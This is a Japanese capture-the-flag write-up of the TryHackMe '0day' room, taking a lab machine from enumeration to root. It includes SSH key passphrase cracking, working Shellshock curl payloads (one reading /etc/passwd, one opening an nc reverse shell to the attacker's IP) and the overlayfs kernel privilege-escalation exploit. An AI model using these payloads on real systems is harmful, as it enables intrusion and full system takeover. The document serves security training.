# 0day CTF

https://tryhackme.com/room/0day

## Enumeration

```shell
TARGET=10.201.51.175
sudo bash -c "echo $TARGET   0day.thm >> /etc/hosts"
```

### ポートスキャン

```sh
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```shell
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

SSH, HTTP

### ディレクトリ列挙

興味深いものが複数ある。

```sh
$ dirsearch -u http://0day.thm     

[14:11:35] 301 -  300B  - /js  ->  http://0day.thm/js/                      
[14:12:06] 301 -  303B  - /admin  ->  http://0day.thm/admin/                
[14:12:07] 200 -    0B  - /admin/                                           
[14:12:09] 200 -    0B  - /admin/index.html                                 
[14:12:33] 301 -  304B  - /backup  ->  http://0day.thm/backup/              
[14:12:33] 200 -    1KB - /backup/                                          
[14:12:38] 301 -  305B  - /cgi-bin  ->  http://0day.thm/cgi-bin/            
[14:12:38] 200 -   13B  - /cgi-bin/test.cgi                                 
[14:12:46] 301 -  301B  - /css  ->  http://0day.thm/css/                    
[14:13:06] 301 -  301B  - /img  ->  http://0day.thm/img/                    
[14:13:11] 200 -  448B  - /js/                                              
[14:13:42] 200 -   38B  - /robots.txt                                       
[14:13:44] 301 -  304B  - /secret  ->  http://0day.thm/secret/              
[14:13:44] 200 -   97B  - /secret/                                          
[14:14:00] 301 -  305B  - /uploads  ->  http://0day.thm/uploads/            
[14:14:00] 200 -    0B  - /uploads/
```

/backup で秘密鍵が表示された。本物かどうかは疑問。

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
（中略）
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

パスフレーズはクラック可能。0day, ryan ユーザーで試したがログインできず。

```sh
$ ssh2john ./id_rsa > hash.txt

$ john ./hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (./id_rsa)
```

CGIのパラメータファジングをしたがヒットせず。

```sh
ffuf -u 'http://0day.thm/cgi-bin/test.cgi?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 13
```

nikto

```sh
$ nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.201.51.175
+ Target Hostname:    10.201.51.175
+ Target Port:        80
+ Start Time:         2025-10-20 14:38:46 (GMT9)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the sitssing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
```

cve が3つほど表示されている。

## CVE-2014-6271

[CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271) が成功した。

```sh
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://0day.thm/cgi-bin/test.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

リバースシェル取得成功

```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 6666 >/tmp/f'" http://0day.thm/cgi-bin/test.cgi
```

```sh
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.51.175] 54843
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

```sh
www-data@ubuntu:/usr/lib/cgi-bin$ ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Sep  2  2020 .
drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
```

ユーザーフラグ発見

```sh
www-data@ubuntu:/home$ ls -al ryan
total 28
drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
```

よくある権限昇格の隙が見当たらないのでカーネルエクスプロイトを探す。

```sh
www-data@ubuntu:/home/ryan$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

```sh
www-data@ubuntu:/home/ryan$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```sh
www-data@ubuntu:/home$ sudo --version
Sudo version 1.8.9p5
Sudoers policy plugin version 1.8.9p5
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.9p5
```

www-data 環境のためか、 gcc が正常に動かず難しい。

```sh
www-data@ubuntu:/tmp$ gcc cow.c -pthread -o dcw
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

export PATH を実行すると一歩進んだが、別のエラー。

```sh
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

www-data@ubuntu:/tmp$ gcc -o cow ./cow.c
/tmp/ccorfNdx.o: In function `main':
cow.c:(.text+0x1f5): undefined reference to `pthread_create'
cow.c:(.text+0x219): undefined reference to `pthread_create'
cow.c:(.text+0x22a): undefined reference to `pthread_join'
cow.c:(.text+0x23b): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
```

脆弱性検索

```sh
$ searchsploit ubuntu 14.04 3.13
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local  | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local  | linux/local/37293.txt
```

昇格成功。

```sh
www-data@ubuntu:/tmp$ gcc -o poc ./37292.c

www-data@ubuntu:/tmp$ ./poc  
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

## 振り返り

- 古い脆弱性を攻撃するタイプで良い練習になった。
- gcc が正常に動かないときいつも諦めていたが、PATH変数で前進できることは大きな学びだった。
